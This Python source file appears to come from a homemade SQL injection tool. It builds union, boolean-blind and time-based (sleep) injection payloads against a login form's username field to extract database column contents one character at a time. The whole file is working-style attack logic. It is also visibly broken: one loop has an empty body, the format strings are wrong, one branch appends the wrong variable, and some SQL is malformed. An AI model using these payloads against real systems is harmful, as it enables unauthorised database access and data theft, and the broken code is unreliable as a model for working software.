#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib.log import logger
from columns import SqliColumns
from config import UnpackFunction

__author__ = "LoRexxar"


class SqliContent(SqliColumns):
    def __init__(self):
        SqliColumns.__init__(self)
        if self.columns_name == 0:
            SqliColumns.get_columns(self)

    # 多线程判断跑数据
    def run_content(self):
        for i in self.content_count:


    # 获取内容
    def get_content(self, database_name, table_name, column_name, limits, content=None):

        # 开始注内容
        logger.info("Start sqli table %s column %s limit %d" % table_name, column_name, limits)

        contents = []
        # 先GET
        if self.sqlirequest == "GET":
            logger.info("The sqlirequest is %s, start sqli content..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)

                # 注这一条的数据长度
                payload = "username=a' or SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                    limits) + ",1%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                content_len = int(UnpackFunction(r))
                logger.info("Contents length sqli success...now is limit %d, The content_len is %d..." % limits,
                            content_len)
                contents.append(content_len)
                # print "[*] content_len: %d" % content_len

                # 然后注content
                payload = "username=a' or SELECT " + column_name + " from " + database_name + "." + table_name + " limit " + repr(
                    limits) + ",1%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                content = UnpackFunction(r)
                logger.info("Content sqli success...The content is %d..." % content)
                # 把content return回去，以元组的形式
                contents.append(content)
                # print "[*] content: %s" % content
                return tuple(contents)

            elif self.sqlimethod == "build":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的 length
                for j in range(0, 30):
                    payload = "username=admi' or select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                        limits) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        content_len = j
                        break

                logger.info("Content length sqli success...The content_len is %d..." % content_len)
                # print "[*] content_len: %d" % content_len
                contents.append(content_len)

                # 然后注content名字
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = "username=admi' or select (SELECT ascii(substring(" + column_name + "," + repr(
                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                            limits) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            content += chr(int(k))
                            break

                logger.info("Content sqli success...The content is %d..." % content)
                # 把content插入列表,并以元祖的方式返回
                contents.append(content)
                # print "[*] content:" + content
                return tuple(contents)

            elif self.sqlimethod == "time":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的length
                for j in range(0, 30):
                    payload = "username=admi' or SELECT if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                        limits) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                    if self.Data.GetTimeData(payload, self.time) == 0:
                        content_len = j
                        break

                logger.info("Content length sqli success...The content_len is %d..." % content_len)
                # print "[*] content_len: %d" % content_len
                contents.append(content_len)

                # 然后注content名字
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = "username=admi' or SELECT if((SELECT  ascii(substring(" + column_name + "," + repr(
                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                            limits) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                        if self.Data.GetTimeData(payload, self.time) == 0:
                            content += chr(int(k))
                            break

                logger.info("Content sqli success...The content is %d..." % content)
                # 把content插入列表
                contents.append(content)
                # print "[*] content:" + content
                return tuple(contents)

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.info("The sqlirequest is %s, start sqli contents..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)

                # 首先是tablename的长度
                payload = {
                    "username": "a' or SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                        limits) + ",1%23", "passwd": "ddog123&submit=Log+In"}
                r = self.Data.PostData(payload)
                content_len = int(UnpackFunction(r))
                logger.info("Content length sqli success...The content_len is %d..." % content_len)
                # print "[*] content_len: %d" % content_len
                contents.append(content_len)

                # 然后注content
                payload = {
                    "username": "ad' or SELECT " + column_name + " from " + database_name + "." + table_name + " limit " + repr(
                        limits) + ",1)%23", "passwd": "ddog123"}
                r = self.Data.PostData(payload)
                content = UnpackFunction(r)
                logger.info("Content sqli success...The content is %d..." % content)
                # 把content插入列表 并返回元组
                contents.append(content)
                # print "[*] content: %s" % content
                return tuple(contents)

            elif self.sqlimethod == "build":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的 length
                for j in range(0, 30):
                    payload = {
                        "username": "admi' or select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                            limits) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        content_len = j
                        break

                logger.info("Content length sqli success...The content_len is %d..." % content_len)
                # print "[*] content_len: %d" % content_len
                contents.append(content_len)

                # 然后注content字
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = {"username": "admi' or select (SELECT ascii(substring(" + column_name + "," + repr(
                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                            limits) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            content += chr(int(k))
                            break

                logger.info("Content sqli success...The content is %d..." % content)
                # 把content插入列表
                contents.append(content)
                # print "[*] content:" + content
                return tuple(contents)

            elif self.sqlimethod == "time":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)

                # 然后注content 的length
                for j in range(0, 30):
                    payload = {
                        "username": "admi' or SELECT if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                            limits) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                    if self.Data.PostTimeData(payload, self.time) == 0:
                        content_len = j
                        break

                logger.info("Content length sqli success...The content_len is %d..." % content_len)
                # print "[*] content_len: %d" % content_len
                contents.append(content)

                # 然后注contents名字
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = {"username": "admi' or SELECT if((SELECT  ascii(substring(" + column_name + "," + repr(
                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                            limits) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                        if self.Data.PostTimeData(payload, self.time) == 0:
                            content += chr(int(k))
                            break

                logger.info("Content sqli success...The content is %d..." % content)
                # 把content插入列表
                contents.append(content)
                # print "[*] content:" + content
                return tuple(contents)

        logger.info("Sqli table %s column %s limit %d success,,," % table_name, column_name, limits)
